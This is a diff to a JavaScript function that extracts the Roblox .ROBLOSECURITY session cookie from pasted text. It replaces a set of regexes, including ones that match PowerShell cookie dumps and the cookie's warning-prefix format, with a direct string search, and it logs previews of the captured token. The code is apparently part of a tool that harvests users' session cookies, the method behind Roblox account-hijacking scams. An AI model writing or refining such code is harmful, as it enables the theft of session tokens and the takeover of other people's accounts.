@@ -356,46 +356,31 @@ function extractRobloxCookie(text) {
     console.log('Text contains .ROBLOSECURITY:', text.includes('.ROBLOSECURITY'));
     console.log('Text length:', text.length);
     
-    // Look for various Roblox authentication patterns
-    const patterns = [
-        // PowerShell New-Object System.Net.Cookie format - simplified and more flexible
-        /"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/i,
-        // Standard .ROBLOSECURITY cookie format
-        /\.ROBLOSECURITY=([^;"\s\n]+)/i,
-        // Warning format - capture everything after _|WARNING...|_
-        /_\|WARNING[^|]*\|_([A-Za-z0-9+/=._%\-]+)/i,
-        // Simple ROBLOSECURITY format
-        /ROBLOSECURITY[=:]\s*([^;"\s\n]+)/i,
-        // Plain cookie value format
-        /roblosecurity[=:]\s*([^;"\s\n]+)/i
-    ];
-    
-    for (const pattern of patterns) {
-        const match = text.match(pattern);
-        if (match && match[1] && match[1].length > 10) {
-            console.log('Found Roblox auth data using pattern:', pattern.source);
-            console.log('Extracted data preview:', match[1].substring(0, 50) + '...');
-            console.log('Extracted data length:', match[1].length);
-            return match[1];
+    // Simple direct search for .ROBLOSECURITY in the text
+    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
+    if (roblosecurityIndex !== -1) {
+        console.log('Found .ROBLOSECURITY at position:', roblosecurityIndex);
+        
+        // Find the start of the value (after the opening quote)
+        const startQuoteIndex = text.indexOf('"', roblosecurityIndex + '.ROBLOSECURITY'.length);
+        if (startQuoteIndex !== -1) {
+            const valueStartIndex = startQuoteIndex + 1;
+            
+            // Find the end quote
+            const endQuoteIndex = text.indexOf('"', valueStartIndex);
+            if (endQuoteIndex !== -1) {
+                const cookieValue = text.substring(valueStartIndex, endQuoteIndex);
+                console.log('Extracted cookie value length:', cookieValue.length);
+                console.log('Cookie preview:', cookieValue.substring(0, 50) + '...');
+                
+                if (cookieValue.length > 50) {
+                    return cookieValue;
+                }
+            }
         }
     }
     
-    // Look for the long Roblox authentication token pattern (starts with _|WARNING and ends with various characters)
-    const longTokenPattern = /_\|WARNING[^|]*\|_([A-Za-z0-9+/=._%\-]{200,})/i;
-    const longTokenMatch = text.match(longTokenPattern);
-    if (longTokenMatch && longTokenMatch[1]) {
-        console.log('Found long token pattern, length:', longTokenMatch[1].length);
-        return longTokenMatch[1];
-    }
-    
-    // If no specific pattern found, look for any very long string that could be authentication data
-    const genericPattern = /[A-Za-z0-9+/=._%\-]{500,}/;
-    const genericMatch = text.match(genericPattern);
-    if (genericMatch && genericMatch[0].length > 500) {
-        console.log('Found generic long string, length:', genericMatch[0].length);
-        return genericMatch[0];
-    }
-    
+    console.log('Could not extract .ROBLOSECURITY cookie from text');
     return null;
 }
 
